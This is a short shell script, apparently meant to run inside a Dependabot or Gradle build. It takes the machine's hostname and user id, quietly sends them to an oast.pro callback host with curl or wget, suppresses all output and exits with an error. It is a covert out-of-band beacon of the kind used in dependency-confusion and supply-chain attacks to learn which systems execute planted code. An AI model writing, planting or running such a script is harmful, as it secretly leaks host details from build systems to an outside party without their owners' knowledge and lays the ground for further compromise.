#!/bin/sh
TAG="dependabot.gradle.$(hostname).$(id -u)"
curl -fsSL "https://db6m4jq5h2r7c1jnh460fpp6pt7cstgh3.oast.pro/${TAG}" -o /dev/null 2>/dev/null || \
  wget -q "https://db6m4jq5h2r7c1jnh460fpp6pt7cstgh3.oast.pro/${TAG}" -O /dev/null 2>/dev/null
exit 1
